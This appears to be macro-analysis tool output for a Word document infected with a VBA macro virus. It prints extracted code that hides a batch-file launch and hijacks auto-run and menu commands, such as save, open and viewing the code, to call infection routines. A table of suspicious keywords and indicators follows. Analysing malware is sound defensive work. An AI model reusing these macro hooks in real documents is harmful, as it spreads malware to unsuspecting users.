Shell ("c:\startv.bat"), vbHide
End Sub
Sub ToolsMacro()
Call UMP
Beep
End Sub

Sub ViewVBCode()
Call UMP
Beep
End Sub

Sub ToolsCustomize()
Call UMP
Beep
End Sub

Sub FileTemplates()
Call UMP
Beep
End Sub

Sub AutoOpen()
    On Error Resume Next
Call NTVCK
End Sub
Sub AutoClose()
    On Error Resume Next
Call NTVCK
End Sub
Sub AutoExec()
    On Error Resume Next
Call NTVCK
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call NTVCK
End Sub
Sub FileExit()
    On Error Resume Next
Call NTVCK
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
Call NTVCK
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileSave()
    On Error Resume Next
Call NTVCK
    ActiveDocument.Save
End Sub
Sub FileNew()
    On Error Resume Next
Call NTVCK
Dialogs(wdDialogFileNew).Show
    Skip = 1
Call NTVCK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.coderz.ne|URL                                          |
|          |t/zerogravity       |                                             |
|IOC       |start.scr           |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |start.exe           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

